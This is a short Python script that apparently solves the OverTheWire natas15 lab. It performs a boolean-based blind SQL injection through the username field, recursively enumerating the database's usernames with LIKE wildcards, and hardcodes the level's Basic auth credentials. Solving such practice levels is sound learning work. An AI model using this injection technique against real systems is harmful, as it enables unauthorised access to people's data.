import requests
import string

def checkUser(username):
    print(f'Checking {username} ... ')
    headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
    data = {'username': f'" or username like "{username}'}
    r = requests.post('http://natas15.natas.labs.overthewire.org', data=data, headers=headers)
    return 'This user exists' in r.content.decode()

knowUser = ''
def findUser(knowUser):
    users = []
    flag = False
    for ch in string.ascii_lowercase + string.digits:
        if checkUser(knowUser + ch + '%'):
            flag = True
            users += findUser(knowUser + ch)
    if not flag and checkUser(knowUser):
        users.append(knowUser)
    print(f'current user: {users}')
    return users
        
findUser(knowUser)

# all users of this database is [alice, bob, charlie, natas16]